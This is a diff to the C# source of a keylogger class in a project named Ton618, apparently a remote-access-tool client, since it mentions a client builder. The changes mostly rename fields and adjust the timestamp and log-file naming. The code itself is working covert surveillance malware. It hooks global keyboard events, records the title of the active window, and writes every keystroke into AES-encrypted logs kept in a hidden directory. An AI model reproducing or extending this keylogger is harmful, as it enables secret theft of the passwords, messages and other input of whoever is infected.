@@ -28,49 +28,49 @@ namespace Ton618.Logging
         public bool IsDisposed { get; private set; }
 
         /// <summary>
-        /// The timer used to periodically flush the <see cref="_logFileBuffer"/> from memory to disk.
+        /// The timer used to periodically flush the <see cref="logBuffer"/> from memory to disk.
         /// </summary>
-        private readonly Timer _timerFlush;
+        private readonly Timer flushTimer;
 
         /// <summary>
         /// The buffer used to store the logged keys in memory.
         /// </summary>
-        private readonly StringBuilder _logFileBuffer = new StringBuilder();
+        private readonly StringBuilder logBuffer = new StringBuilder();
 
         /// <summary>
         /// Temporary list of pressed keys while they are being processed.
         /// </summary>
-        private readonly List<Keys> _pressedKeys = new List<Keys>();
+        private readonly List<Keys> pressedKeys = new List<Keys>();
 
         /// <summary>
         /// Temporary list of pressed keys chars while they are being processed.
         /// </summary>
-        private readonly List<char> _pressedKeyChars = new List<char>();
+        private readonly List<char> pressedKeyChars = new List<char>();
 
         /// <summary>
         /// Saves the last window title of an application.
         /// </summary>
-        private string _lastWindowTitle = string.Empty;
+        private string lastWindowTitle = string.Empty;
 
         /// <summary>
         /// Determines if special keys should be ignored for processing, e.g. when a modifier key is pressed.
         /// </summary>
-        private bool _ignoreSpecialKeys;
+        private bool ignoreSpecialKeys;
 
         /// <summary>
         /// Used to hook global mouse and keyboard events.
         /// </summary>
-        private readonly IKeyboardMouseEvents _mEvents;
+        private readonly IKeyboardMouseEvents globalEvents;
 
         /// <summary>
         /// Provides encryption and decryption methods to securely store log files.
         /// </summary>
-        private readonly Aes256 _aesInstance = new Aes256(Settings.ENCRYPTIONKEY);
+        private readonly Aes256 aes = new Aes256(Settings.ENCRYPTIONKEY);
 
         /// <summary>
         /// The maximum size of a single log file.
         /// </summary>
-        private readonly long _maxLogFileSize;
+        private readonly long maxLogFileSize;
 
         /// <summary>
         /// Initializes a new instance of <see cref="Keylogger"/> that provides keylogging functionality.
@@ -79,10 +79,10 @@ namespace Ton618.Logging
         /// <param name="maxLogFileSize">The maximum size of a single log file.</param>
         public Keylogger(double flushInterval, long maxLogFileSize)
         {
-            _maxLogFileSize = maxLogFileSize;
-            _mEvents = Hook.GlobalEvents();
-            _timerFlush = new Timer { Interval = flushInterval };
-            _timerFlush.Elapsed += TimerElapsed;
+            this.maxLogFileSize = maxLogFileSize;
+            globalEvents = Hook.GlobalEvents();
+            flushTimer = new Timer { Interval = flushInterval };
+            flushTimer.Elapsed += TimerElapsed;
         }
 
         /// <summary>
@@ -91,7 +91,7 @@ namespace Ton618.Logging
         public void Start()
         {
             Subscribe();
-            _timerFlush.Start();
+            flushTimer.Start();
         }
 
         /// <summary>
@@ -111,9 +111,9 @@ namespace Ton618.Logging
             if (disposing)
             {
                 Unsubscribe();
-                _timerFlush.Stop();
-                _timerFlush.Dispose();
-                _mEvents.Dispose();
+                flushTimer.Stop();
+                flushTimer.Dispose();
+                globalEvents.Dispose();
                 WriteFile();
             }
 
@@ -125,9 +125,9 @@ namespace Ton618.Logging
         /// </summary>
         private void Subscribe()
         {
-            _mEvents.KeyDown += OnKeyDown;
-            _mEvents.KeyUp += OnKeyUp;
-            _mEvents.KeyPress += OnKeyPress;
+            globalEvents.KeyDown += OnKeyDown;
+            globalEvents.KeyUp += OnKeyUp;
+            globalEvents.KeyPress += OnKeyPress;
         }
 
         /// <summary>
@@ -135,9 +135,9 @@ namespace Ton618.Logging
         /// </summary>
         private void Unsubscribe()
         {
-            _mEvents.KeyDown -= OnKeyDown;
-            _mEvents.KeyUp -= OnKeyUp;
-            _mEvents.KeyPress -= OnKeyPress;
+            globalEvents.KeyDown -= OnKeyDown;
+            globalEvents.KeyUp -= OnKeyUp;
+            globalEvents.KeyPress -= OnKeyPress;
         }
 
         /// <summary>
@@ -149,21 +149,25 @@ namespace Ton618.Logging
         private void OnKeyDown(object sender, KeyEventArgs e)
         {
             var activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
-            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
+            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != lastWindowTitle)
             {
-                _lastWindowTitle = activeWindowTitle;
-                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>"
-                    + HttpUtility.HtmlEncode(activeWindowTitle) + " - "
-                    + DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo)
-                    + " UTC</b>]</p><br>");
+                lastWindowTitle = activeWindowTitle;
+                logBuffer
+                    .Append(@"<p class=""h""><br><br>[<b>")
+                    .Append(HttpUtility.HtmlEncode(activeWindowTitle))
+                    .Append(" - Local=")
+                    .Append(DateTime.Now.ToString("t", DateTimeFormatInfo.InvariantInfo))
+                    .Append(" UTC=")
+                    .Append(DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo))
+                    .Append("</b>]</p><br>");
             }
 
-            if (_pressedKeys.ContainsModifierKeys())
+            if (pressedKeys.ContainsModifierKeys())
             {
-                if (!_pressedKeys.Contains(e.KeyCode))
+                if (!pressedKeys.Contains(e.KeyCode))
                 {
                     Debug.WriteLine("OnKeyDown: " + e.KeyCode);
-                    _pressedKeys.Add(e.KeyCode);
+                    pressedKeys.Add(e.KeyCode);
                     return;
                 }
             }
@@ -172,36 +176,36 @@ namespace Ton618.Logging
             {
                 // The key was not part of the keys that we wish to filter, so
                 // be sure to prevent a situation where multiple keys are pressed.
-                if (!_pressedKeys.Contains(e.KeyCode))
+                if (!pressedKeys.Contains(e.KeyCode))
                 {
                     Debug.WriteLine("OnKeyDown: " + e.KeyCode);
-                    _pressedKeys.Add(e.KeyCode);
+                    pressedKeys.Add(e.KeyCode);
                 }
             }
         }
 
         /// <summary>
-        /// Processes pressed keys and appends them to the <see cref="_logFileBuffer"/>. Processing of Unicode characters starts here.
+        /// Processes pressed keys and appends them to the <see cref="logBuffer"/>. Processing of Unicode characters starts here.
         /// </summary>
         /// <param name="sender">The sender of  the event.</param>
         /// <param name="e">The key press event args, especially the pressed KeyChar.</param>
         /// <remarks>This event handler is called second.</remarks>
         private void OnKeyPress(object sender, KeyPressEventArgs e)
         {
-            if (_pressedKeys.ContainsModifierKeys() && _pressedKeys.ContainsKeyChar(e.KeyChar))
+            if (pressedKeys.ContainsModifierKeys() && pressedKeys.ContainsKeyChar(e.KeyChar))
                 return;
 
-            if ((!_pressedKeyChars.Contains(e.KeyChar) || !DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
+            if ((!pressedKeyChars.Contains(e.KeyChar) || !DetectKeyHolding(pressedKeyChars, e.KeyChar)) && !pressedKeys.ContainsKeyChar(e.KeyChar))
             {
                 var filtered = HttpUtility.HtmlEncode(e.KeyChar.ToString());
                 if (!string.IsNullOrEmpty(filtered))
                 {
                     Debug.WriteLine("OnKeyPress Output: " + filtered);
-                    if (_pressedKeys.ContainsModifierKeys())
-                        _ignoreSpecialKeys = true;
+                    if (pressedKeys.ContainsModifierKeys())
+                        ignoreSpecialKeys = true;
 
-                    _pressedKeyChars.Add(e.KeyChar);
-                    _logFileBuffer.Append(filtered);
+                    pressedKeyChars.Add(e.KeyChar);
+                    logBuffer.Append(filtered);
                 }
             }
         }
@@ -214,8 +218,8 @@ namespace Ton618.Logging
         /// <remarks>This event handler is called third.</remarks>
         private void OnKeyUp(object sender, KeyEventArgs e)
         {
-            _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
-            _pressedKeyChars.Clear();
+            logBuffer.Append(HighlightSpecialKeys(pressedKeys.ToArray()));
+            pressedKeyChars.Clear();
         }
 
         /// <summary>
@@ -242,7 +246,7 @@ namespace Ton618.Logging
             var names = new string[keys.Length];
             for (var i = 0; i < keys.Length; i++)
             {
-                if (!_ignoreSpecialKeys)
+                if (!ignoreSpecialKeys)
                 {
                     names[i] = keys[i].GetDisplayName();
                     Debug.WriteLine("HighlightSpecialKeys: " + keys[i] + " : " + names[i]);
@@ -250,20 +254,20 @@ namespace Ton618.Logging
                 else
                 {
                     names[i] = string.Empty;
-                    _pressedKeys.Remove(keys[i]);
+                    pressedKeys.Remove(keys[i]);
                 }
             }
 
-            _ignoreSpecialKeys = false;
+            ignoreSpecialKeys = false;
 
-            if (_pressedKeys.ContainsModifierKeys())
+            if (pressedKeys.ContainsModifierKeys())
             {
                 var specialKeys = new StringBuilder();
 
                 var validSpecialKeys = 0;
                 for (var i = 0; i < names.Length; i++)
                 {
-                    _pressedKeys.Remove(keys[i]);
+                    pressedKeys.Remove(keys[i]);
                     if (string.IsNullOrEmpty(names[i]))
                         continue;
 
@@ -283,7 +287,7 @@ namespace Ton618.Logging
 
             for (var i = 0; i < names.Length; i++)
             {
-                _pressedKeys.Remove(keys[i]);
+                pressedKeys.Remove(keys[i]);
                 if (string.IsNullOrEmpty(names[i]))
                     continue;
 
@@ -296,7 +300,7 @@ namespace Ton618.Logging
                         normalKeys.Append(@"<p class=""h"">[Esc]</p>");
                         break;
                     default:
-                        normalKeys.Append(@"<p class=""h"">[" + names[i] + "]</p>");
+                        normalKeys.Append(@"<p class=""h"">[").Append(names[i]).Append("]</p>");
                         break;
                 }
             }
@@ -307,7 +311,7 @@ namespace Ton618.Logging
 
         private void TimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            if (_logFileBuffer.Length > 0)
+            if (logBuffer.Length > 0)
                 WriteFile();
         }
 
@@ -319,7 +323,9 @@ namespace Ton618.Logging
             // TODO: Add some house-keeping and delete old log entries
             var writeHeader = false;
 
-            var filePath = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));
+            var fileName = Settings.GetKeyLogFileNameFormat(0);
+            var filePath = Path.Combine(Settings.LOGSPATH, fileName);
+            //var filePath = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));
 
             try
             {
@@ -332,17 +338,22 @@ namespace Ton618.Logging
                     di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
 
                 var i = 1;
+                var prevName = filePath;
                 while (File.Exists(filePath))
                 {
                     // Large log files take a very long time to read, decrypt and append new logs to,
                     // so create a new log file if the size of the previous one exceeds _maxLogFileSize.
                     var length = new FileInfo(filePath).Length;
-                    if (length < _maxLogFileSize)
+                    if (length < maxLogFileSize)
                         break;
 
                     // append a number to the file name
-                    var newFileName = $"{Path.GetFileName(filePath)}_{i}";
-                    filePath = Path.Combine(Settings.LOGSPATH, newFileName);
+                    //var newFileName = $"{Path.GetFileName(filePath)}_{i}";
+                    //filePath = Path.Combine(Settings.LOGSPATH, newFileName);
+                    fileName = Settings.GetKeyLogFileNameFormat(i);
+                    filePath = Path.Combine(Settings.LOGSPATH, fileName);
+                    if (prevName.Equals(filePath, StringComparison.OrdinalIgnoreCase)) // Prevent infinite loop if the client builder omitted file index template
+                        filePath = Path.Combine(Settings.LOGSPATH, $"{Path.GetFileName(filePath)}_{i}");
                     i++;
                 }
 
@@ -353,19 +364,16 @@ namespace Ton618.Logging
 
                 if (writeHeader)
                 {
-                    logFile.Append(
-                        "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
-                        DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo) + " UTC<br><br>");
-
+                    logFile.Append("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Input log created on ").Append(DateTime.Now.ToString("f", DateTimeFormatInfo.InvariantInfo)).Append(" Local, ").Append(DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo)).Append(" UTC<br><br>");
                     logFile.Append("<style>.h { color: 0000ff; display: inline; }</style>");
 
-                    _lastWindowTitle = string.Empty;
+                    lastWindowTitle = string.Empty;
                 }
 
-                if (_logFileBuffer.Length > 0)
-                    logFile.Append(_logFileBuffer);
+                if (logBuffer.Length > 0)
+                    logFile.Append(logBuffer);
 
-                FileHelper.WriteLogFile(filePath, logFile.ToString(), _aesInstance);
+                FileHelper.WriteLogFile(filePath, logFile.ToString(), aes);
 
                 logFile.Clear();
             }
@@ -373,7 +381,7 @@ namespace Ton618.Logging
             {
             }
 
-            _logFileBuffer.Clear();
+            logBuffer.Clear();
         }
     }
 }
